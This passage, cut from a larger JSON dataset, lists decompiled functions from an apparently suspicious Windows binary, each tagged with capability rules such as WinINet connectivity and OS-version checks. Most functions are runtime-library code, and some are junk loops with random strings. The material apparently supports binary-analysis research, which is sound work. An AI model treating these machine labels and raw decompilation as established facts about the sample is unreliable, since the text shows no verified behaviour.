*0x574458 = pcVar3;\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n    }\n    *arg_8h = 0;\n    return arg_8h;\n}\n",
        "token_count": 993
    },
    "0040325b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040325b(int32_t param_1)\n\n{\n    if (*(param_1 + 0x14) != '\\0') {\n        fcn.0040640b(*(param_1 + 8));\n        *(param_1 + 0x14) = 0;\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00403274": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00403274(uint arg_8h)\n\n{\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    for (var_18h = 0x4a; 0 < var_18h; var_18h = var_18h + -1) {\n    }\n    fcn.00403b02(&stack0x00000018);\n    return;\n}\n",
        "token_count": 129
    },
    "0040328d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040328d(char *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint *in_ECX;\n    \n    arg_ch = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        do {\n            arg_ch = arg_ch + 1;\n        } while (arg_8h[arg_ch] != '\\0');\n        if (arg_ch != 0) {\n            fcn.004067b2(arg_8h, arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "004032ce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004032ce(int32_t arg_8h, uint32_t arg_ch, char *arg_10h)\n\n{\n    code *pcVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (arg_10h == NULL) {\n        fcn.004025a9(\"bad locale name\");\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    if ((*arg_10h != '*') || (arg_10h[1] != '\\0')) {\n        if (arg_ch == 0) {\n            arg_10h = NULL;\n        }\n        else if (arg_ch != 0x3f) {\n            iVar3 = 0;\n            do {\n                if ((arg_ch & (1 << (iVar3 & 0x1f)) >> 1) != 0) {\n                    fcn.00405f24(iVar3, arg_10h);\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 6);\n            iVar3 = fcn.00405f24(0, arg_10h);\n            goto code_r0x00468339;\n        }\n        iVar3 = fcn.00405f24(0, arg_10h);\n    }\ncode_r0x00468339:\n    if (iVar3 == 0) {\n        iVar3 = 0x553c10;\n    }\n    else {\n        pcVar2 = *(arg_8h + 0x2c);\n        if (pcVar2 == NULL) {\n            pcVar2 = arg_8h + 0x30;\n        }\n        if ((*pcVar2 == '*') && (pcVar2[1] == '\\0')) {\n            return arg_8h;\n        }\n    }\n    fcn.00404c00(iVar3);\n    return arg_8h;\n}\n",
        "token_count": 431
    },
    "00403332": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403332(ushort *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "00403346": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00403346(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.00403a35();\n        *puVar6 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0bd5:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a0bd9:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a0bdc:\n            cVar4 = fcn.00405939(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a0b81:\n                arg_8h = 0x10;\n                goto code_r0x004a0bdc;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a0b95;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a0b69;\n                }\n            }\ncode_r0x004a0be5:\n            cVar4 = fcn.00403ba2();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00404f52();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0be5;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a0b95:\n            cVar4 = fcn.00404183(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004044c1();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0be5;\n            if (cVar4 == 'i') goto code_r0x004a0bd5;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00402ce3();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.0040159b();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a0b81;\n            }\n            goto code_r0x004a0bd9;\n        }\ncode_r0x004a0b69:\n        cVar4 = fcn.0040367f();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x004a0c6b;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a0c6b:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00404039(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.0040549d(&uStack8, arg_ch, arg_14h);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00404039(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.0040553d(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00404039(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2375
    },
    "00403387": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403387(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403675(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 354
    },
    "00403413": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403413(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar3 = **(in_ECX + 0x46c + uVar1 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 340
    },
    "00403517": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403517(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_3ch;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x450c40;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 2;\n    fcn.00401e79(\"cadqizxxrgighfaewpsfhelmvtgbtlofjowvbv\");\n    for (var_44h = 0x15; 0 < var_44h; var_44h = var_44h + -1) {\n    }\n    var_10h = 3;\n    fcn.00401e79(\"hxltvpjobfo\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 321
    },
    "00403535": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00403535(uint *arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402d47(arg_ch * 8 + 0x554f88);\n    pcVar1 = *0x574458 + 1;\n    if ((**0x574458 != '@') || (pcVar1 = *0x574458 + 2,  (*0x574458)[1] != '_')) {\n        *0x574458 = pcVar1;\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        *(arg_8h + 1) = 2;\n        return arg_8h;\n    }\n    *0x574458 = *0x574458 + 3;\n    fcn.0040358a(&var_10h, 0);\n    fcn.0040358a(&var_10h, 0);\n    cVar2 = **0x574458;\n    if (cVar2 != '\\0') {\n        do {\n            if (cVar2 == '@') break;\n            *0x574458 = *0x574458 + 1;\n            cVar2 = **0x574458;\n        } while (cVar2 != '\\0');\n        if (**0x574458 != '\\0') {\n            *0x574458 = *0x574458 + 1;\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n    }\n    *0x574458 = *0x574458 + -1;\n    fcn.004017df(1);\n    return arg_8h;\n}\n",
        "token_count": 413
    },
    "0040353f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040353f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00403846();\n    iVar1 = *0x573c1c;\n    if ((iVar2 != 0) && (arg_8h == '\\0')) {\n        *0x573c1c = 0;\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 105
    },
    "00403562": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403562(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(in_ECX + 0x48) = arg_ch == 1;\n    *(in_ECX + 0x3d) = 0;\n    fcn.0040223e();\n    if (arg_8h != 0) {\n        var_4h = 0;\n        var_8h = 0;\n        var_ch = 0;\n        fcn.0040402a(arg_8h, &var_4h, &var_8h, &var_ch);\n        *(in_ECX + 0xc) = var_4h;\n        *(in_ECX + 0x10) = var_4h;\n        *(in_ECX + 0x1c) = var_8h;\n        *(in_ECX + 0x20) = var_8h;\n        *(in_ECX + 0x2c) = var_ch;\n        *(in_ECX + 0x30) = var_ch;\n    }\n    *(in_ECX + 0x4c) = arg_8h;\n    uVar2 = *0x574114;\n    uVar1 = *0x574110;\n    *(in_ECX + 0x38) = 0;\n    *(in_ECX + 0x40) = uVar1;\n    *(in_ECX + 0x44) = uVar2;\n    return;\n}\n",
        "token_count": 366
    },
    "00403567": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00403567(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack120;\n    int32_t iStack116;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x417fb0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"ecqlwwkjughxoklhufklihczmlqszxuxdmbtprwlzujlmfooopsjnwxbzqlmntxznnqprloqtknmwa\");\n    for (iStack116 = 0xc; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    for (iStack120 = 0x2f; 0 < iStack120; iStack120 = iStack120 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 293
    },
    "0040358a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.0040358a(uint *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *puVar4;\n    bool bVar5;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar5 = **0x574458 != 'Q';\n    if (!bVar5) {\n        *0x574458 = *0x574458 + 1;\n    }\n    cVar1 = **0x574458;\n    if (cVar1 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    if ((cVar1 < '0') || ('9' < cVar1)) {\n        fcn.00401906(&var_28h);\n        if (var_20h == '\\0') {\n            if (**0x574458 != '\\0') {\n                uVar3 = 0;\n                var_4h = 2;\n                var_8h = 0;\n                puVar4 = &var_8h;\n                goto code_r0x0048f1ad;\n            }\n            puVar4 = fcn.004017df(1);\n        }\n        else {\n            *0x574458 = *0x574458 + 1;\n            if (arg_ch == '\\0') {\n                if (bVar5) goto code_r0x0048f132;\n                goto code_r0x0048f0fa;\n            }\n            if (!bVar5) {\n                uVar3 = fcn.00404a5c(var_28h, var_24h);\n                goto code_r0x0048f0ff;\n            }\n            puVar4 = fcn.00404a5c(var_28h, var_24h);\n        }\n    }\n    else {\n        uVar2 = cVar1;\n        if (bVar5) {\n            var_28h = uVar2 - 0x2f;\n            var_24h = (uVar2 >> 0x1f) + -1 + (0x2e < uVar2);\n            *0x574458 = *0x574458 + 1;\ncode_r0x0048f132:\n            puVar4 = fcn.0040127b(var_28h, var_24h);\n        }\n        else {\n            var_28h = uVar2 - 0x2f;\n            *0x574458 = *0x574458 + 1;\n            var_24h = var_28h >> 0x1f;\ncode_r0x0048f0fa:\n            uVar3 = fcn.0040127b(var_28h, var_24h);\ncode_r0x0048f0ff:\n            fcn.00402d47(0x571ce0);\n            fcn.004053b7(&var_8h, uVar3);\n            puVar4 = &var_8h;\n        }\n    }\n    uVar3 = *puVar4;\ncode_r0x0048f1ad:\n    *arg_8h = uVar3;\n    arg_8h[1] = puVar4[1];\n    return arg_8h;\n}\n",
        "token_count": 770
    },
    "004035ad": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.004035ad(uint arg_8h)\n\n{\n    int32_t iStack40;\n    int32_t iStack36;\n    \n    for (iStack36 = 9; 0 < iStack36; iStack36 = iStack36 + -1) {\n    }\n    for (iStack40 = 8; 0 < iStack40; iStack40 = iStack40 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    return *0x546fb4;\n}\n",
        "token_count": 134
    },
    "004035e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004035e4(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *in_ECX = arg_8h;\n    piVar1 = fcn.00404def();\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n    }\n    return in_ECX;\n}\n",
        "token_count": 108
    },
    "00403616": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00403616(uint arg_8h)\n\n{\n    int32_t *arg_8h_00;\n    uint arg_8h_01;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffffb4;\n    var_10h = 0xffffffff;\n    var_14h = 0x4271a0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.0040620d(0);\n    var_24h = *0x573bd0;\n    arg_8h_01 = fcn.004052f4();\n    var_10h = 0;\n    var_2ch = fcn.00402171(arg_8h_01);\n    if (var_2ch == NULL) {\n        if (var_24h == NULL) {\n            iVar1 = fcn.00402c89(&var_24h, arg_8h);\n            if (iVar1 == -1) {\n                fcn.004058b7();\n            }\n            arg_8h_00 = var_24h;\n            fcn.00403e59(var_24h);\n            var_10h = 1;\n            fcn.004023e2(arg_8h_00);\n            (**(*arg_8h_00 + 4))();\n            *0x573bd0 = var_24h;\n            var_2ch = var_24h;\n            fcn.004058e4();\n            fcn.0040153c();\n        }\n        else {\n            var_2ch = var_24h;\n        }\n    }\n    fcn.004036f2();\n    *in_FS_OFFSET = var_18h;\n    return var_2ch;\n}\n",
        "token_count": 505
    },
    "0040362a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040362a(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x450400;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    for (var_2ch = 0x30; 0 < var_2ch; var_2ch = var_2ch + -1) {\n    }\n    var_10h = 1;\n    fcn.00401e79(\"ylxxlb\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 255
    },
    "0040365c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0040365c(uint arg_8h, uint arg_ch)\n\n{\n    if ((*0x573c20 == '\\0') || (arg_ch == '\\0')) {\n        fcn.00402c4d(arg_8h);\n        fcn.004011b3(arg_8h);\n    }\n    return 1;\n}\n",
        "token_count": 78
    },
    "00403661": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
